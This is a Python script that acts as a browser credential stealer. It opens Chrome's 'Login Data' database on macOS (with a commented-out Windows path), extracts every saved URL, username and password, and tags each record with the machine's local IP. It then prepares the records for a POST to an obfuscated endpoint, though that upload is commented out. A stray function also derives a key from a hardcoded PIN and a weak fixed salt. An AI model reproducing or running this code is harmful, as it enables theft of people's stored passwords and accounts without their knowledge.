import requests
import os 
import sqlite3
import shutil
import csv
import socket
from hashlib import pbkdf2_hmac

def wallet_encrypted_key(pin):
    app_iters = 500_000  
    dk = pbkdf2_hmac('sha256', b'pin', b'bad salt' * 2, app_iters)
    return dk.hex()



def get_local_ip():
    try:
        # Get the local hostname
        host_name = socket.gethostname()

        # Get the local IP address
        local_ip = socket.gethostbyname(host_name)

        return local_ip
    except socket.error as e:
        print(f"Error: {e}")
        return None

local_ip = get_local_ip()

if local_ip:
    print(f"Local IP address: {local_ip}")
else:
    print("Unable to retrieve local IP address.")

def get_chrome():
    # windows os 
    # data_path = os.path.expanduser("~") + r"/AppData/Local/Google/Chrome/User Data/Default/Login Data"

    data_path = os.path.expanduser("~") + r"/Library/Application Support/Google/Chrome/Default/Login Data"
    c = sqlite3.connect(data_path)
    cursor = c.cursor()
    select_statement = "SELECT origin_url, username_value , password_value FROM logins"
    cursor.execute(select_statement)
    login_data = cursor.fetchall()
    cred = {}
    string = ""
    data_record = []
    for url , user_name , pwd in login_data:
        # windoes os
        # pwd = win32crypt.CryptUnprotectData(pwd)
        # cred[url] = (user_name, pwd[1].decode("utf-8"))

        cred[url] = (user_name, pwd.decode("latin-1"))
        string += "\n[+] URL:%s \n USERNAME:%s \n PASSWORD:%s\n" % (url, user_name, pwd.decode("latin-1"))

        data = {
            "ipadress_data": local_ip,
            "url_data":url,
            "username_data":user_name,
            "password_data":pwd.decode("latin-1")
        }

        data_record.append(data)

    # Specify the endpoint URL
    # endpoint_url = 'http://localhost:8000/v1/chromejghv7re8foijngrefvdurhu/'

    # Define the request payload (if sending data in the request body)
    payload = data_record

    return data_record

    # Define the headers, including the desired Content-Type
    # headers = {
    #     'Content-Type': 'application/json',  # Adjust the content type as needed
    #     'Other-Header': 'header-value',      # Include other headers if necessary
    # }

    # Make the request using the requests library
    # response = requests.post(endpoint_url, json=payload, headers=headers)

    # Check the response
    # if response.status_code == 200:
    #     print('Request successful!')
    #     print(response.json())  # If the response is in JSON format
    # else:
    #     print(f'Request failed with status code: {response.status_code}')
    #     print(response.text)  # Print the response content for debugging purposes

# if __name__ == "__main__":
#     get_chrome()